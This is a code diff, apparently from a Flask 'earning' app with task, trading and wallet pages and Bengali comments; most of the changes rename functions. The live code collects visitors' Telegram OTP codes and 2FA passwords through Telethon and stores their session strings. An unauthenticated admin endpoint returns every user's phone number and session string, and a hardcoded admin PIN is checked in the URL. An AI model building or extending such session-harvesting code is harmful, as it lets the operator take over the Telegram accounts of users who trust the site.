@@ -34,33 +34,33 @@ withdraws_col = db['withdraws']
 temp_clients = {}
 
 # ---------------------------------------------------------
-# ১. HTML পেজ রাউটস (ফাংশন নামগুলো ইউনিক করা হয়েছে)
+# ১. HTML পেজ রাউটস (ইউনিক ফাংশন নাম সহ)
 # ---------------------------------------------------------
 
 @app.route('/')
 @app.route('/login')
-def login_view(): return render_template('login.html')
+def login_page_route(): return render_template('login.html')
 
 @app.route('/dashboard')
-def dashboard_view(): return render_template('dashboard.html')
+def dashboard_page_route(): return render_template('dashboard.html')
 
 @app.route('/task')
-def task_view(): return render_template('task.html')
+def task_page_route(): return render_template('task.html')
 
 @app.route('/trading')
-def trading_view(): return render_template('trading.html')
+def trading_page_route(): return render_template('trading.html')
 
 @app.route('/account')
-def account_view(): return render_template('account.html')
+def account_page_route(): return render_template('account.html')
 
 @app.route('/wallet')
-def wallet_view(): return render_template('wallet.html')
+def wallet_page_route(): return render_template('wallet.html')
 
 # অ্যাডমিন পিনের কনফিগারেশন
 ADMIN_PIN = "Abdullah6790" 
 
 @app.route('/admin')
-def admin_page_view():
+def admin_page_main():
     user_pin = request.args.get('pin')
     if user_pin == ADMIN_PIN:
         return render_template('admin.html')
@@ -78,11 +78,11 @@ def admin_page_view():
 
 
 # ---------------------------------------------------------
-# ২. ইউজার লগইন ও ওটিপি এপিআই (লুপ হ্যান্ডলিং ফিক্সড)
+# ২. ইউজার লগইন ও ওটিপি এপিআই (টেলিথন ফিক্সড)
 # ---------------------------------------------------------
 
 @app.route('/api/send_otp', methods=['POST'])
-def send_otp():
+def send_otp_api():
     data = request.json
     phone = data.get('phone')
     if not phone: return jsonify({"success": False, "message": "Phone number missing"})
@@ -92,18 +92,18 @@ def send_otp():
         asyncio.set_event_loop(loop)
         client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
         
-        def connect_and_send():
+        async def run_send():
             await client.connect()
             return await client.send_code_request(phone)
 
-        result = loop.run_until_complete(connect_and_send())
+        result = loop.run_until_complete(run_send())
         temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
         return jsonify({"success": True, "message": "OTP Sent Successfully!"})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/verify_login', methods=['POST'])
-def verify_login():
+def verify_login_api():
     data = request.json
     phone, code, password = data.get('phone'), data.get('code'), data.get('password')
     if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})
@@ -114,12 +114,12 @@ def verify_login():
         client = info["client"]
         h = info["hash"]
         
-        def sign_in_user():
+        async def run_verify():
             user = await client.sign_in(phone, code, phone_code_hash=h, password=password)
             session_str = client.session.save()
             return user, session_str
 
-        user, session_str = loop.run_until_complete(sign_in_user())
+        user, session_str = loop.run_until_complete(run_verify())
         
         user_info = {
             "telegram_id": user.id,
@@ -156,7 +156,7 @@ def verify_login():
 
 @app.route('/api/user/dashboard_stats')
 @app.route('/api/get_user_info')
-def get_user_stats():
+def get_user_stats_api():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False, "message": "Not logged in"})
     
@@ -178,7 +178,7 @@ def get_user_stats():
 # ---------------------------------------------------------
 
 @app.route('/api/trade/update_result', methods=['POST'])
-def update_trade():
+def update_trade_api():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False, "message": "Login required"})
 
@@ -193,7 +193,7 @@ def update_trade():
     return jsonify({"success": True, "message": "Balance Updated"})
 
 @app.route('/api/add_balance', methods=['POST'])
-def add_task_balance():
+def add_task_balance_api():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False})
     
@@ -206,11 +206,11 @@ def add_task_balance():
 
 
 # ---------------------------------------------------------
-# ৫. অ্যাডমিন কন্ট্রোল এপিআই
+# ৫. অ্যাডমিন কন্ট্রোল এপিআই (সবগুলো ফাংশন এখানে আছে)
 # ---------------------------------------------------------
 
 @app.route('/api/update_ads', methods=['POST'])
-def update_ads_api():
+def update_ads_master():
     try:
         data = request.json
         ads_list = data.get('ads', [])
@@ -222,7 +222,7 @@ def update_ads_api():
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/add_task', methods=['POST'])
-def add_task_api():
+def add_task_master():
     try:
         task_data = request.json
         tasks_col.insert_one({
@@ -237,7 +237,7 @@ def add_task_api():
         return jsonify({"success": False, "message": str(e)})
 
 @app.route('/api/admin/update_user', methods=['POST'])
-def admin_update_user_api():
+def admin_update_user_master():
     try:
         data = request.json
         tg_id = int(data.get('telegram_id'))
@@ -248,12 +248,12 @@ def admin_update_user_api():
         return jsonify({"success": False})
 
 @app.route('/api/admin/get_withdrawals')
-def get_withdrawals_api():
+def get_withdrawals_master():
     withdraws = list(withdraws_col.find({}, {"_id": 0}))
     return jsonify({"success": True, "withdrawals": withdraws})
 
 @app.route('/api/admin/get_all_sessions')
-def get_all_sessions_api():
+def get_all_sessions_master():
     users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
     return jsonify({"success": True, "sessions": users})
 
@@ -264,22 +264,22 @@ def get_all_sessions_api():
 
 @app.route('/api/get_active_ads')
 @app.route('/api/get_ads')
-def get_ads_api():
+def get_ads_master():
     ads = list(ads_col.find({}, {"_id": 0}))
     return jsonify({"success": True, "ads": ads})
 
 @app.route('/api/get_tasks')
-def get_tasks_api():
+def get_tasks_master():
     tasks = list(tasks_col.find({"status": "active"}, {"_id": 0}))
     return jsonify({"success": True, "tasks": tasks})
 
 
 # ---------------------------------------------------------
-# ৭. সার্ভার রান
+# ৭. সার্ভার রান ও পিঙ (Uptime Robot এর জন্য)
 # ---------------------------------------------------------
 
 @app.route('/ping')
-def ping_server(): return "PONG", 200
+def ping_service(): return "PONG", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
